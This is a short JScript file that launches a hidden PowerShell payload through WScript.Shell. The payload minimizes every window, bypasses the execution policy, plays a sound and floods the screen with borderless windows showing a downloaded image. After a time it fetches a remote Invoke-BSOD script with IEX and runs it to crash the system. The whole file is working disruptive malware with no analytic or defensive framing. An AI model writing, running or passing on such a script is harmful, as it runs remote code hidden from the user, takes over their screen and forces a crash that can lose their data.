c = '$a = New-Object System.Media.SoundPlayer;' +
    '$a.SoundLocation = \'res\\t.wav\';' +
    '[void][reflection.assembly]::LoadWithPartialName(\'System.Net.Http\');' +
    '[void][reflection.assembly]::LoadWithPartialName(\'System.Windows.Forms\');' +
    '$s = [System.Drawing.Bitmap]::new((New-Object System.Net.Http.HttpClient).GetStreamAsync(\'https://s6.imgcdn.dev/bvDTK.png\').Result);' +
    '$ti = 0;' +
    'function nf {' +
    '    $f = New-Object system.Windows.Forms.Form;' +
    '    $f.StartPosition = \'manual\';' +
    '    $f.BackColor = \'#ffffff\';' +
    '    $f.Top = (Get-Random -Minimum 0 -Maximum 1000);' +
    '    $f.Left = (Get-Random -Minimum 0 -Maximum 2000);' +
    '    $f.Width = 350;' +
    '    $f.Height = 310;' +
    '    $f.FormBorderStyle = \'none\';' +
    '    $i = New-Object system.Windows.Forms.PictureBox;' +
    '    $i.Image = $s;' +
    '    $i.Width = 32767;' +
    '    $i.Height = 32767;' +
    '    $f.Controls.AddRange(@($i));' +
    '    return $f' +
    '}' +
    '(New-Object -ComObject Shell.Application).MinimizeAll();' +
    'Set-ExecutionPolicy Bypass -scope Process -Force;' +
    '$a.Play();' +
    'while ($true) {' +
    '    (nf).Show();' +
    '    if ($i -gt 490) {' +
    '        IEX((New-Object Net.Webclient).DownloadString(\'https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1\'));Invoke-BSOD;' +
    '    }' +
    '    $i ++;' +
    '    Start-Sleep -Milliseconds 50;' +
    '}';

cm = 'cmd /c powershell ' + c
new ActiveXObject('WScript.Shell').run(cm,0,true);
